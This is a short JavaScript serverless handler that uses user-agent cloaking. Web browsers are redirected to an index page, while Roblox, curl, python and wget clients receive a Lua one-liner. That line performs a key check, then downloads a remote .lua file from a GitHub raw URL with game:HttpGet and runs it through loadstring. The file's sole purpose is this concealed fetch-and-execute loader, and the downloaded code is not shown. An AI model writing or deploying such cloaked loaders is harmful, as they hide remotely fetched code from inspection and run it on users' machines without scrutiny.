module.exports = (req, res) => {
    const ua = req.headers["user-agent"] || "";
    const accept = req.headers["accept"] || "";

    const browser = accept.includes("text/html") &&
        !/Roblox|HttpClient|curl|python|wget/i.test(ua);

    if (browser) {
        return res.redirect(307, "/index.html");
    }

    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.setHeader("Cache-Control", "no-store");

    return res.send('if (...) ~= "persistence" then game:GetService("Players").LocalPlayer:Kick("") return end loadstring(game:HttpGet("https://raw.githubusercontent.com/iavitadumitru56-ai/Persistence.github.io/refs/heads/main/yahuisosiebanatsukoeblantupoisosimoihui.lua"))()');
};
